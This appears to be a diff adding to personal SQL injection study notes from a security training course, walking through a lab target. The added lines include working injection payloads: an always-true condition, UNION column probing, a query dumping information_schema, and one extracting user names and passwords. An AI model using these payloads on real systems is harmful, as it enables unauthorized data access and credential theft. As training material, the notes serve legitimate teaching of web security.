@@ -326,7 +326,7 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/05-sql-injection-sl
 
     Example - Injecting Your Statement
     User enters TOM' OR 1='1 in the name and pass fields
-    Truth Statement: tom ' OR 1='1
+    Truth Statement: tom' OR 1='1
     Server-Side query executed would appear like this:
     SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 
@@ -336,6 +336,35 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/05-sql-injection-sl
     3. set a value in the url -> set the value in the request field to raw
     4. copy and paste that value into the url with a ? after the php
     5. view page source
+
+    **SQL on database** POST Method
+    http://10.50.28.178/Union.html
+    Ford
+    Dodge
+    Honda
+    Audi
+    
+    Audi' OR 1='1 -> ends up showing full table.
+    now we can try using union -> Audi' Union select 1,2,3,4,5 #
+        You're guessing the numbers in union select until you see the table displayed properly.
+    UNION select <column>,<column>,<column> FROM <Databases>.<Tables>
+    table_schema = Databases names
+    table_name = Tables names
+    column_name = Columns names
+
+    "Golden statement" -> Audi' Union select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+    (this shows the entire database pretty much)
+
+    If we wanted to view something specific (cost of a car)
+    Audi' Union select name,2,cost,type,color FROM session.car #
+    ex 2:
+    Audi' Union select id,2,name,pass,5 FROM session.user #
+
+    
+
+    
+    
+    
     
 
 
